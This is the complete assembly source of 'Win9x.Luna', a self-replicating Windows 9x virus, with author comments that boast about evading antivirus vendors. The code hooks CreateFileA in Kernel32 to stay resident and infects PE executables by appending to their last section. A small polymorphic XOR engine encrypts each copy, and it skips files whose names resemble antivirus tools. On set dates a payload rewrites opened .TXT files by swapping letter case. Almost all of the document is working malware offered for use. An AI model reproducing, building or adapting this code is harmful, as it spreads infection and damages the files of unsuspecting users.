;
;   Win9x.Luna coded by Bumblebee
;
;   Disclaimer
;   ~~~~~~~~~~
;  Erm... this  is the source  of a VIRUS.  Feel free to use at  your will.
; Notice  that  the  author is not  responsabile  of the  damages that  may
; occur due to the assembly of  this file.  This file is  plain ASCII  code
; and at the date of today -i hope :?- this can't make any  kind of damage.
;
;
;   Introduction
;   ~~~~~~~~~~~~
;  I started a  win32 virus  (Win32.Deus)  and when i was  working on  it i
; realized... hey! i did two viruses:  a win32 part and a win9x part.  So i
; thougth  to test  the win9x  part with  a single virus:  Luna. Coding and
; coding the win32 part stoped growing and win9x one... buff.
;
;  I coded the virus  in 3 parts  easy to test:  residence,  infection  and
; polymorphism. Later  i merged the  parts and tested it. The debug process
; under  windows is  really a  shit with resident viruses. I think all will
; work fine.
;
;  Doing residence i tested a lot of APIs,  looking  for the best  to hook.
; 'CreateProcessA'  -like K32 by Nigro-  gives  some  problems  due to that
; sometimes the names are  with " and args of the file  being executed  can
; be annoying. 'VxDCall0'  -like win9x.HPS by Griyo- is  the best to patch,
; but this API  has a lot of  traffic...  and  this  can be  annoying  too.
; But the reason to not use this API was only i wanted to do something new.
;  So i decided to patch 'CreateFileA'.  I've never  thought how many times
; can  be  opened  a  EXE file  by  windows...  cool!  Showing  properties,
; executing, Explorer getting icon, ... This API  is cute  to patch ;)  The
; only one problem is cache... but if the Explorer starts infected all will
; go fine ;)
;  Another thing i must decide was the way of  residence:  using hole  into
; Kernel32  -Nigro's  method-  or  allocating  some   memory  with  VxDCall
; -Griyo's one-. The 1st method  is cute,  but kernel32  in win95 has  poor 
; holes to use.  This method  is only nice  for win98.  So i decided to use
; Griyo's one 'cause the virus is harder to detect into memory, and we want
; the avers to work ;)
;
;  Infection part was the most easy and borring. Nothing to say. I increase
; the last section using the avaliable space there. Files with big aligment
; will show less  size change.  This part is the  less stable.  This due to
; i can't test all file  types to  show if works.  I hope it will work with
; files with 6 or less sections. This is actually verified by the virus.
;
;  Poly part  was unexpected. I wanted to do something like a cavity virus,
; but this  damn piece of code  grows by seconds ;)  So encryption and poly
; was a need.  I coded the  'Luna Poly Engine' in about  6 hours. I'm happy
; when  i think  the  time  needed for  avers to detect  this bug ;P It has
; nothing really 'good'. It's a xor loop with variable opcodes.
;
;
;   Brief description
;   ~~~~~~~~~~~~~~~~~
;       . win9x resident virus patching CreateFileA into memory
;       . variable encryption with polymorphism
;       . infects win PE EXE files increasing last section
;       . exception handling:
;               - startup process
;               - infection process
;               - payload process
;       . infection process using VxDCALL0 and int21h
;       . avoids infect some av progs: avp, drweb, f-prot, nod-ice, ...
;       . active payload:
;               - xchg uppercase,lowercase and xchg lowercase,uppercase
;                 in the .TXT files opened in date activation
;
;
;   Thanx to
;   ~~~~~~~~
;       . Griyo and Nigro: Without their work this virus will not exist.
;         ­Que buenos! De mayor quiero ser como vosotros ;)
;       . Billy Belcebu, Virus Buster, Mr. Sandman, Super, Wizard,
;         Wintermute, Nigro and Griyo: Es que los 'spanish guys'somos
;         los mejores... solo nos falta ganar un mundial ;)
;
;  I'm really worried  due to the great people that is leaving  the scene...
;  Jack Qwerty, Vecna, ... espero que de vez en cuando nos deis algo grande.
;
;
;                                                       The way of the bee
;
.386p
locals
jumps
.model flat,STDCALL

        L equ <LARGE>
        vSize           equ     vEnd-vBegin+dSize ; virus size
        vPages          equ     (vSize+0fffh)/1000h ; number of pages
        APITOHOOK       equ     'CreateFileA'   ; name of the API to hook
        KERNEL32        equ     0bff70000h      ; address of the kernel (w9x)

        extrn           ExitProcess:PROC        ; needed for 1st generation

.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'

.CODE

vBegin  label   byte
inicio:
        call    vEnd                            ; decrypt

cryptCodeB:
        pushad

        call    getDelta                        ; get delta offset
getDelta:
        pop     ebp
        sub     ebp,offset getDelta

        lea     eax,dword ptr [esp-8h]          ; enable exception handling
        xor     esi,esi
        xchg    eax,dword ptr fs:[esi]
        lea     edi,exception+ebp
        push    edi
        push    eax

        mov     eax,KERNEL32+400h               ; residence check
        cmp     dword ptr [eax],'anuL'
        je      skipResidence

        mov     edi,KERNEL32                    ; get VxDCALL0
        mov     ax,word ptr [edi]
        cmp     ax,'ZM'
        jne     skipResidence                   ; ops...
        mov     edi,dword ptr [edi+3ch]
        add     edi,KERNEL32
        cmp     word ptr [edi],'EP'
        jne     skipResidence                   ; ops... (bis)
        mov     edi,dword ptr [edi+78h]
        lea     edi,dword ptr [edi+1ch+KERNEL32]
        mov     edi,dword ptr [edi]

        mov     edi,dword ptr [edi+KERNEL32]
        add     edi,KERNEL32

        ; save VxDCALL0 address
        mov     dword ptr [_VxDCALL0+ebp],edi

        mov     byte ptr [payloadFlag+ebp],0

        mov     eax,00002a00h                   ; get date
        call    int21h

        cmp     dl,15                           ; day: 15
        jne     skipPayload

        and     dh,1                            ; month: 1,3,5,7,9,11
        or      dh,dh
        jz      skipPayload

        mov     byte ptr [payloadFlag+ebp],1

skipPayload:
        mov     esi,KERNEL32                    ; get API to hook
        mov     esi,dword ptr [esi+3ch]         ; scaning the kernel
        add     esi,KERNEL32
        mov     esi,dword ptr [esi+78h]
        add     esi,KERNEL32+1ch

        lodsd
        add     eax,KERNEL32
        mov     dword ptr [address+ebp],eax
        lodsd
        add     eax,KERNEL32
        mov     dword ptr [names+ebp],eax
        lodsd
        add     eax,KERNEL32
        mov     dword ptr [ordinals+ebp],eax

        xor     ecx,ecx
        mov     edx,ecx
        lea     esi,sApiToHook+ebp

        mov     cl,sizeApiString

searchl:
        push    ecx
        push    esi
        mov     edi,dword ptr [names+ebp]
        add     edi,edx
        mov     edi,dword ptr [edi]
        add     edi,KERNEL32
        rep     cmpsb
        je      fFound
        add     edx,4
        pop     esi
        pop     ecx
        jmp     searchl
fFound:
        pop     esi
        pop     ecx
        shr     edx,1
        add     edx,dword ptr [ordinals+ebp]
        xor     ebx,ebx
        mov     bx,word ptr [edx]
        shl     ebx,2
        add     ebx,dword ptr [address+ebp]
        mov     ecx,dword ptr [ebx]
        add     ecx,KERNEL32

        mov     dword ptr [_ApiToHook+ebp],ecx  ; save the address of the
                                                ; API

        ; ahh... HPS. Nice virus. The nigro's method makes the
        ; virus has less memory to play with, and i have the VxDCALL0 ;)
        ; Let's use Griyo's method to alloc some memory
        push    00020000h or 00040000h
        push    vPages
        push    80060000h                       ; shared memory ;)
        push    00010000h                       ; _PageReserve
        call    dword ptr [_VxDCALL0+ebp]
        cmp     eax,-1                          ; error... :(
        je      skipResidence

        mov     dword ptr [memAddress+ebp],eax
        mov     ecx,offset APIHookMain-offset inicio
        mov     dword ptr [jumpPatch+1+ebp],ecx
        add     dword ptr [jumpPatch+1+ebp],eax ; fix the patch code with
                                                ; this address

        push    00020000h or 00040000h or 80000000h or 8h
        push    L 0h
        push    L 1h
        push    vPages
        shr     eax,12
        push    eax
        push    00010001h                       ; _PageCommit
        call    dword ptr [_VxDCALL0+ebp]
        cmp     eax,0                           ; error... :(
        je      skipResidence

        mov     eax,KERNEL32+400h               ; make the residence sign
        shr     eax,12                          ; the page into eax
        call    _PageModifyPermissions
        jc      skipResidence                   ; error! -> skip res stuff
        mov     eax,KERNEL32+400h
        mov     dword ptr [eax],'anuL'

        ; patch the API: 1st make the page r/w
        mov     eax,dword ptr [_ApiToHook+ebp]
        shr     eax,12                          ; the page into eax
        call    _PageModifyPermissions
        jc      skipResidence                   ; error! -> skip res stuff

        cld                                     ; copy the virus into
        lea     esi,vBegin+ebp                  ; the reserved address
        mov     edi,dword ptr [memAddress+ebp]
        mov     ecx,L (vSize - dSize)
        rep     movsb
                                                ; 2nd: get original API
        cld                                     ; bytes
        mov     edi,offset patchBuffer-offset inicio
        add     edi,dword ptr [memAddress+ebp]
        mov     esi,offset _ApiToHook-offset inicio
        add     esi,dword ptr [memAddress+ebp]
        mov     esi,dword ptr [esi]
        mov     ecx,jumpSize
        rep     movsb

        mov     al,0
        call    patchAPI                        ; 3rd: just Patch!

        jmp     skipResidence

exception:                                      ; if the virus jumps
        xor     esi,esi                         ; here means we are
        mov     eax,dword ptr fs:[esi]          ; under Nt or something
        mov     esp,dword ptr [eax]             ; went wrong :(
skipResidence:
        xor     esi,esi
        pop     dword ptr fs:[esi]               ; disable exception
        pop     eax                              ; handling

        popad

returnHost:                                     ; return to host
                db  68h                         ; push hardcoded
hostEntry       dd  offset exit
        ret

vId             db      0dh,0ah,'Win9x.Luna Coded by Bumblebee',0dh,0ah

;
;       change the page addressed by eax permissions to read/write
;
_PageModifyPermissions:
        push    L 20060000h
        push    L 0h
        push    L 1h
        push    L eax
        push    L 1000dh
        mov     eax,dword ptr [_VxDCALL0+ebp]
        call    eax                             ; make the page r/w
        cmp     eax,-1
        je      pageModifyError                 ; error?
        clc
        ret

pageModifyError:
        stc
        ret

;
;       Call to int12h using VxDCall0
;
int21h:
        push    ecx
        push    eax
        push    002a0010h
        call    dword ptr [_VxDCALL0+ebp]
        ret

;
; virus data
;
_VxDCALL0       dd      0                       ; address of VxDCALL0
jumpPatch       db      68h                     ; code to patch API
                dd      0
                ret
jumpSize        equ     offset $-offset jumpPatch ; needed for patchAPI
patchBuffer     db      jumpSize dup(0)           ; needed for patchAPI
hFileSize       equ     160
hFilename       db      hFileSize dup(0)          ; to store opened filenames
memAddress      dd      ?

; here begins stuff needed for API search
address         dd      ?
names           dd      ?
ordinals        dd      ?
sizeApiString           equ     offset _ApiToHook-offset sApiToHook
sApiToHook      db      APITOHOOK,0
_ApiToHook      dd      ?
; here ends stuff needed for API search

; some strings to test if the virus is about to infect an av prog
avStrings       dw      'va','VA','rd','RD','-f','-F','na','NA','ec','EC'
                dw      'ip','IP','bt','BT'
vStringsCout    equ     (offset $-offset avStrings)/2

; some data for the payload ;)
payloadFlag     db      0

;
;       Patches/restores the API
;       al==0 patches
;       al!=0 restores
;
patchAPI:
        call    patchDelta
patchDelta:
        pop     ebp
        sub     ebp,offset patchDelta

        cld
        mov     edi,offset _ApiToHook-offset inicio
        add     edi,dword ptr [memAddress+ebp]
        mov     edi,dword ptr [edi]
        mov     ecx,jumpSize

        or      al,al
        jz      doPatch

        mov     esi,offset patchBuffer-offset inicio
        add     esi,dword ptr [memAddress+ebp]
        rep     movsb
        ret

doPatch:
        mov     esi,offset jumpPatch-offset inicio
        add     esi,dword ptr [memAddress+ebp]
        rep     movsb
        ret

;
;       Searches for the word in ax the zstring addr by esi
;       found = stc
;       not found = clc
;
filter:
        push    esi                             ; doesn't change esi
        push    esi                             ; 1st get the size of
        xor     ecx,ecx                         ; the zstring
filter0:
        cmp     byte ptr [esi],0
        je      filter1
        inc     ecx
        inc     esi
        jmp     filter0

filter1:
        pop     esi                             ; now search
        jmp     filter4
filter2:
        cmp     word ptr [esi],ax
        jne     filter3
        pop     esi
        stc
        ret
filter3:
        inc     esi
        dec     ecx
filter4:
        cmp     ecx,2
        jnb     filter2
        pop     esi
        clc
        ret

;
;       hehehehehehe (or in spanish: jejejejejeje)
;
payload:
        mov     al,byte ptr [payloadFlag+ebp]
        or      al,al
        jnz     doPayTXT                        ; ;)

        jmp     payOff                          ; :(
doPayTXT:
        mov     eax,0000716Ch                   ; open LFN existing file r/w
        mov     ebx,00000002h
        xor     ecx,ecx
        mov     edx,00000001h
        lea     esi,hFilename+ebp
        call    int21h
        jc      payOff

        xchg    ebx,eax
        mov     dword ptr [fHnd+ebp],ebx        ; save file handle

        mov     eax,00004202h                   ; seek end of file
        xor     edx,edx
        xor     ecx,ecx
        call    int21h
        jc      payOffC

        mov     dword ptr [fileSize+ebp],eax    ; save size of file

        add     eax,0fffh                       ; add 0fffh
        xor     edx,edx                         ; calc pages
        mov     ecx,00001000h
        div     ecx
        mov     dword ptr [memPages+ebp],eax

        push    00020000h or 00040000h          ; alloc some memory
        push    eax
        push    80080000h
        push    00010000h
        call    dword ptr [_VxDCALL0+ebp]
        cmp     eax,-1
        je      payOffC

        mov     dword ptr [mHnd+ebp],eax        ; save memory handle

        push    00020000h or 00040000h          ; commit the memory
        push    L 0h
        push    L 1h
        push    dword ptr [memPages+ebp]
        shr     eax,12                          ; get page number
        push    eax                                
        push    00010001h
        call    dword ptr [_VxDCALL0+ebp]
        cmp     eax,0
        je      payOffCFree

        mov     ebx,dword ptr [fHnd+ebp]
        mov     eax,00004200h                   ; seek begin of file
        xor     edx,edx
        xor     ecx,ecx
        call    int21h
        jc      payOffCFree

        mov     eax,00003f00h                   ; read the entire file
        mov     ecx,dword ptr [fileSize+ebp]
        mov     edx,dword ptr [mHnd+ebp]
        call    int21h
        jc      payOffCFree

        lea     eax,dword ptr [esp-8h]          ; enable exception handling
        xor     esi,esi
        xchg    eax,dword ptr fs:[esi]
        lea     edi,exceptPay+ebp
        push    edi
        push    eax

        mov     esi,dword ptr [mHnd+ebp]        ; changes uppercase
        mov     ecx,dword ptr [fileSize+ebp]    ; by lowercase
payLoop:                                        ; and lowercase
        mov     ax,'ZA'                         ; by uppercase
        cmp     byte ptr [esi],al
        jb      lowC
        cmp     byte ptr [esi],ah
        ja      lowC
        add     byte ptr [esi],'a'-'A'
        jmp     otherPay
lowC:
        mov     ax,'za'
        cmp     byte ptr [esi],al
        jb      otherPay
        cmp     byte ptr [esi],ah
        ja      otherPay
        sub     byte ptr [esi],'a'-'A'
otherPay:
        inc     esi
        loop    payLoop

        mov     eax,00004200h                   ; seek begin of file
        xor     edx,edx
        xor     ecx,ecx
        call    int21h
        jc      qExceptPay

        mov     ecx,dword ptr [fileSize+ebp]    ; write all the file
        mov     eax,00004000h
        mov     edx,dword ptr [mHnd+ebp]
        call    int21h

        jmp     qExceptPay
        
exceptPay:
        xor     esi,esi                         ; uh...
        mov     eax,dword ptr fs:[esi]
        mov     esp,dword ptr [eax]

        call    exceptDeltaP
exceptDeltaP:
        pop     ebp
        sub     ebp,offset exceptDeltaP

qExceptPay:
        xor     esi,esi
        pop     dword ptr fs:[esi]              ; disable exception
        pop     eax                             ; handling

payOffCFree:                                    ; free memory
        push    L 0h
        push    dword ptr [mHnd+ebp]
        push    0001000Ah
        call    dword ptr [_VxDCALL0+ebp]

payOffC:
        mov     ebx,dword ptr [fHnd+ebp]
        mov     eax,00003e00h
        call    int21h

payOff:
        jmp     goAPIHooked

;
;       API Hook
;
APIHookMain:                                    ; the main of the virus
        pushad

        call    memDelta
memDelta:
        pop     ebp
        sub     ebp,offset memDelta

        mov     esi,dword ptr [esp+24h]         ; get filename from stack

        cld
        lea     edi,hFilename+ebp               ; copy to hFilename
        xor     ecx,ecx
getNextChar:
        cmp     byte ptr [esi],0
        je      endGetFilename
        movsb
        inc     ecx
        cmp     ecx,hFileSize                   ; our buffer is small :(
        je      goAPIHooked
        jmp     getNextChar
endGetFilename:
        movsb                                   ; get and count zero too
        inc     ecx

        cmp     ecx,5                           ; enough length?
        jbe     goAPIHooked

        cmp     dword ptr [edi-5],'TXT.'        ; test if it's .TXT
        je      payload

        cmp     dword ptr [edi-5],'txt.'        ; test if it's .txt
        je      payload

        cmp     dword ptr [edi-5],'EXE.'        ; test if it's .EXE
        je      testIfAv

        cmp     dword ptr [edi-5],'exe.'        ; test if it's .exe
        jne     goAPIHooked

testIfAv:                                       ; let's search for strings
                                                ; that may appear in av progs
        lea     esi,hFilename+ebp
        lea     edi,avStrings+ebp
        mov     ecx,vStringsCout
testIfAvL:
        push    ecx
        mov     ax,word ptr [edi]
        call    filter
        pop     ecx
        jc      goAPIHooked
        add     edi,2
        loop    testIfAvL

isExe:
        call    infection

goAPIHooked:
        mov     al,1
        call    patchAPI                        ; restore the API

        popad

        call    memDelta2
memDelta2:
        pop     eax
        sub     eax,offset memDelta2

        pop     dword ptr [back+eax]            ; get caller address

        mov     eax,dword ptr [_ApiToHook+eax]
        call    eax                             ; call original API
                                                ; i modify eax... no matter
                                                ; the API changes it too ;)
        pushad
        mov     al,0
        call    patchAPI                        ; patch the API
        popad

        db      68h                             ; push hardcoded
back    dd      0                               ; address to return to
                                                ; addr of API caller
        ret

; data needed for infection process
fileAttrib      dd      ?
fileTime        dd      ?
fileDate        dd      ?
fileSize        dd      ?
memPages        dd      ?
mHnd            dd      ?
fHnd            dd      ?
modSize         dd      ?
dDelta          dd      ?
tSize           dd      ?

;
;       Infects the file with name stored into hFilename
;
infection:
        pushad
        xor     ebx,ebx
        mov     eax,00007143h                   ; LFN get attributes
        lea     edx,hFilename+ebp
        call    int21h
        jc      infErrorOut
        mov     dword ptr [fileAttrib+ebp],ecx  ; save attrib

        xor     ecx,ecx
        mov     eax,00007143h                   ; LFN set attributes
        lea     edx,hFilename+ebp
        mov     bl,01h
        call    int21h
        jc      infErrorOut

        mov     eax,00007143h                   ; LFN get last write time
        mov     bl,04h
        lea     edx,hFilename+ebp
        call    int21h
        jc      infErrorOut

        mov     dword ptr [fileTime+ebp],ecx    ; save this stuff
        mov     dword ptr [fileDate+ebp],edi

        mov     eax,0000716Ch                   ; open LFN existing file r/w
        mov     ebx,00000002h
        xor     ecx,ecx
        mov     edx,00000001h
        lea     esi,hFilename+ebp
        call    int21h
        jc      infErrorOut

        xchg    ebx,eax
        mov     dword ptr [fHnd+ebp],ebx        ; save file handle

        mov     eax,00004202h                   ; seek end of file
        xor     edx,edx
        xor     ecx,ecx
        call    int21h
        jc      infErrorOutC

        mov     dword ptr [fileSize+ebp],eax    ; save size of file

        add     eax,0fffh                       ; add 0fffh

        xor     edx,edx                         ; calc pages
        mov     ecx,00001000h
        div     ecx
        mov     dword ptr [memPages+ebp],eax

        push    00020000h or 00040000h          ; alloc some memory
        push    eax
        push    80080000h
        push    00010000h
        call    dword ptr [_VxDCALL0+ebp]
        cmp     eax,-1
        je      infErrorOutC

        mov     dword ptr [mHnd+ebp],eax        ; save memory handle

        push    00020000h or 00040000h          ; commit the memory
        push    L 0h
        push    L 1h
        push    dword ptr [memPages+ebp]
        shr     eax,12                          ; get page number
        push    eax                                
        push    00010001h
        call    dword ptr [_VxDCALL0+ebp]
        cmp     eax,0
        je      infErrorOutCFree

        mov     ebx,dword ptr [fHnd+ebp]
        mov     eax,00004200h                   ; seek begin of file
        xor     edx,edx
        xor     ecx,ecx
        call    int21h
        jc      infErrorOutCFree

        mov     eax,00003f00h                   ; read the entire file
        mov     ecx,dword ptr [fileSize+ebp]
        mov     edx,dword ptr [mHnd+ebp]
        call    int21h
        jc      infErrorOutCFree

        ; at this point all is ready for the infection process
        ; Let's do it!
        ;
        ; some stuff (section):
        ;
        ;   Plaze      Length       Desc
        ;    00h        08h          Name of the baby
        ;    08h        04h          virtual size
        ;    0ch        04h          RVA
        ;    10h        04h          phys size (pointer to raw data)
        ;    14h        04h          phys offset (pointer to relocations)
        ;    1ch        0ch          shit, shit, shit
        ;    24h        04h          Properties of the baby
        ;

        lea     eax,dword ptr [esp-8h]          ; enable exception handling
        xor     esi,esi
        xchg    eax,dword ptr fs:[esi]
        lea     edi,exceptInf+ebp
        push    edi
        push    eax

        mov     edx,dword ptr [mHnd+ebp]
        cmp     word ptr [edx+12h],'*C'         ; check inf sign
        je      qExceptInf
        mov     word ptr [edx+12h],'*C'         ; add inf sign
        mov     eax,dword ptr [mHnd+ebp]
        add     eax,dword ptr [fileSize+ebp]
        add     edx,dword ptr [edx+3ch]
        cmp     edx,eax
        jnb     qExceptInf
        cmp     word ptr [edx],'EP'             ; check PE sign
        jne     qExceptInf

        xor     ecx,ecx
        xor     eax,eax
        xor     ebx,ebx

        mov     esi,edx
        add     esi,18h                         ; skip image file header
        mov     ax,word ptr [edx+14h]           ; get and add size of
        add     esi,eax                         ; optional header to esi
        xor     eax,eax

        ; we want to infect the last section in file... so
        ; search the one with the biggest phys offset
        mov     cx,word ptr [edx+06h]           ; get number of sections
        cmp     cx,6                            ; we want nSections<=6
        ja      qExceptInf
        mov     edi,esi
        push    cx
sectionsLoop:
        cmp     dword ptr [edi+14h],eax         ; it's bigger ?
        jb      skipThis
        mov     ebx,ecx                         ; store number
        mov     eax,dword ptr [edi+14h]         ; get as bigger
skipThis:
        add     edi,28h                         ; next section
        loop    sectionsLoop

        pop     cx
        sub     ecx,ebx                         ; the desired section into
                                                ; ecx
        mov     eax,028h
        push    edx
        mul     ecx                             ; mul by the size of
        pop     edx                             ; each section to get
        add     esi,eax                         ; offset of the section

        mov     eax,esi
        add     eax,28h                         ; size of the modified
        mov     dword ptr [modSize+ebp],eax     ; part of the file

        mov     eax,dword ptr [esi+10h]         ; get phys size
        add     eax,L vSize                     ; add virus size
        mov     ecx,dword ptr [edx+3ch]         ; get the aligment
        push    edx
        xor     edx,edx
        div     ecx                             ; div phys+vSize/aligment
        inc     eax                             ; plus one
        xor     edx,edx
        mul     ecx                             ; mul by aligment
        mov     dword ptr [esi+10h],eax         ; set new phys size
        pop     edx

        mov     eax,dword ptr [edx+50h]         ; get image size
        add     eax,L vSize                     ; add virus size
        mov     ecx,dword ptr [edx+3ch]         ; get the aligment
        push    edx
        xor     edx,edx
        div     ecx                             ; div image+vSize/aligment
        inc     eax                             ; plus one
        xor     edx,edx
        mul     ecx                             ; mul by aligment
        pop     edx
        mov     dword ptr [edx+50h],eax         ; set image size

        mov     eax,dword ptr [esi+8h]          ; get virtual size
        mov     edi,eax                         ; save
        add     eax,L vSize                     ; add virus size
        mov     ecx,dword ptr [edx+3ch]         ; get the aligment
        push    edx
        xor     edx,edx
        div     ecx                             ; div virtSize+vSize/aligment
        inc     eax                             ; plus one
        xor     edx,edx
        mul     ecx                             ; mul by aligment
        mov     dword ptr [esi+8h],eax          ; set virtual size
        pop     edx

        mov     ecx,edi                         ; get old virtual size
        add     ecx,dword ptr [esi+0ch]         ; add RVA
        push    ecx                             ; save
        xchg    ecx,dword ptr [edx+28h]         ; set new entry point
        add     ecx,dword ptr [edx+34h]         ; add base
        mov     dword ptr [hostEntry+ebp],ecx   ; save into our return host
                                                ; code
        pop     ecx
        add     ecx,dword ptr [edx+34h]         ; add base
        mov     dword ptr [dDelta+ebp],ecx      ; save

        or      dword ptr [esi+24h],0a0000020h  ; set our lovely flags ;)

        add     edi,dword ptr [esi+14h]         ; add phys offset
        mov     ebx,dword ptr [fHnd+ebp]
        mov     eax,00004200h                   ; seek addr of virus
        mov     edx,edi
        mov     ecx,edi
        shr     ecx,10h
        call    int21h
        jc      qExceptInf

        lea     edi,vEnd+ebp                    ; make a copy of the virus
        lea     esi,vBegin+ebp
        mov     ecx,L (vSize - dSize)
        rep     movsb

otherKey:
        mov     ah,0ffh                         ; get a crypt key
        call    rnd
        or      al,al
        jz      otherKey

        mov     esi,dword ptr [dDelta+ebp]
        add     esi,offset cryptCodeB-offset inicio
        lea     edi,vEnd+ebp
        add     edi,L (vSize - dSize)
        mov     ecx,offset vEnd-offset cryptCodeB

        push    esi ecx                         ; encrypt the virus
        lea     esi,vEnd+ebp
        add     esi,offset cryptCodeB-offset inicio
mCryptL:
        xor     byte ptr [esi],al
        inc     esi
        loop    mCryptL
        pop     ecx esi

        call    Lpe                             ; generate decryptor

        mov     ebx,dword ptr [fHnd+ebp]
        mov     ecx,L vSize                     ; write the virus
        mov     eax,00004000h
        lea     edx,vEnd+ebp
        call    int21h
        jc      qExceptInf

        mov     eax,00004200h                   ; seek begin of file
        xor     edx,edx
        xor     ecx,ecx
        call    int21h
        jc      qExceptInf

        mov     ecx,dword ptr [modSize+ebp]     ; write only the modified
        sub     ecx,dword ptr [mHnd+ebp]        ; part of the file
        mov     eax,00004000h
        mov     edx,dword ptr [mHnd+ebp]
        call    int21h

        jmp     qExceptInf

exceptInf:
        xor     esi,esi                         ; uh...
        mov     eax,dword ptr fs:[esi]
        mov     esp,dword ptr [eax]

        call    exceptDelta
exceptDelta:
        pop     ebp
        sub     ebp,offset exceptDelta

qExceptInf:
        xor     esi,esi
        pop     dword ptr fs:[esi]              ; disable exception
        pop     eax                             ; handling

infErrorOutCFree:                               ; free memory
        push    L 0h
        push    dword ptr [mHnd+ebp]
        push    0001000Ah
        call    dword ptr [_VxDCALL0+ebp]

infErrorOutC:
        mov     ebx,dword ptr [fHnd+ebp]
        mov     eax,00003e00h
        call    int21h

        xor     ebx,ebx
        mov     ecx,dword ptr [fileAttrib+ebp]
        mov     eax,00007143h                   ; LFN restore attributes
        lea     edx,hFilename+ebp
        mov     bl,01h
        call    int21h

        mov     eax,00007143h                   ; LFN restore lst w time/date
        lea     edx,hFilename+ebp
        mov     bl,03h
        mov     ecx,dword ptr [fileTime+ebp]
        mov     edi,dword ptr [fileDate+ebp]
        call    int21h

infErrorOut:
        popad
        ret

;
;       [Lpe] - Luna Poly Engine
;       IN:
;               edi     offset to put the decryptor
;               esi     offset of code to decrypt
;               al      crypt key
;               ecx     size of the code to decrypt
;
;       OUT:
;               ecx     decryptor size
;               don't care of the other regs!
;
;       max decryptor size: 88 bytes
;
dSize           equ             88
Lpe:
        push    edi                             ; save init
        push    ax                              ; save key
        mov     edx,esi                         ; save addr of code to crypt
        lea     esi,_esi+ebp

        xor     eax,eax
        mov     ah,1
        call    rnd                             ; esi or edi...
        push    ecx
        xor     ecx,ecx
        mov     cl,10
        push    edx
        xor     edx,edx
        mul     cl
        add     esi,eax
        pop     edx
        pop     ecx

        movsb                                   ; pushad

        call    insShit

        movsb                                   ; push edi/esi
        mov     dword ptr [edi],edx
        add     edi,4

        call    insShit

        movsb                                   ; push ecx
        mov     dword ptr [edi],ecx
        add     edi,4

        call    insShit

        movsb                                   ; pop   ecx

        call    insShit

        movsb                                   ; pop   esi/edi

        pop     ax
        push    edi                             ; save for loop
        push    ax

        call    insShit

        pop     ax                              ; xor
        movsw
        mov     byte ptr [edi],al
        inc     edi

        call    insShit

        movsb                                   ; inc esi/edi

        call    insShit

        mov     dword ptr [edi],0e2h            ; loop
        inc     edi
        pop     edx
        mov     eax,edi
        sub     eax,edx
        mov     cl,0ffh
        sub     cl,al
        mov     byte ptr [edi],cl
        inc     edi

        call    insShit

        movsw                           ; popad ... ret

        pop     edx
        sub     edi,edx
        mov     ecx,edi

        ret
; Lpe data
_esi    db      60h,68h,68h, 59h,5eh, 80h,36h, 46h,61h,0c3h
_edi    db      60h,68h,68h, 59h,5fh, 80h,37h, 47h,61h,0c3h
_shit   db      43h,48h,52h,58h,33h,0dbh,87h,0d3h,33h,0d0h
;
;       Random shit generator
;
insShit:
        push    esi ecx edx eax ebx
        xor     eax,eax
        mov     ah,3
        call    rnd
        inc     al
        xor     ecx,ecx
        mov     cl,al                   ; 1/4 shit ops
        mov     dl,0
nopeNope:
        mov     ah,7
        call    rnd
        cmp     al,4
        ja      nopeNope
        cmp     al,dl
        je      nopeNope
        mov     dl,al
        push    ecx
        xor     ecx,ecx
        mov     cl,2
        push    edx
        xor     edx,edx
        mul     cl
        pop     edx
        pop     ecx
        lea     esi,_shit+ebp
        add     esi,eax
        movsw                           ; each shit op is 2 bytes long
        loop    nopeNope

        pop     ebx eax edx ecx esi
        ret
;
;       Gets a (random_number AND ah) into al
;
rnd:
        push    edx
        push    eax
        push    ecx
        mov     eax,00002c00h                   ; get date
        call    int21h

        pop     ecx
        pop     eax
        xor     dl,dh
        mov     al,dl
        and     al,ah
        sub     ah,ah
        pop     edx
        ret

vEnd:
        ret

exit:
        push    L 0h                            ; go out
        call    ExitProcess
        jmp     exit

Ends
End     inicio


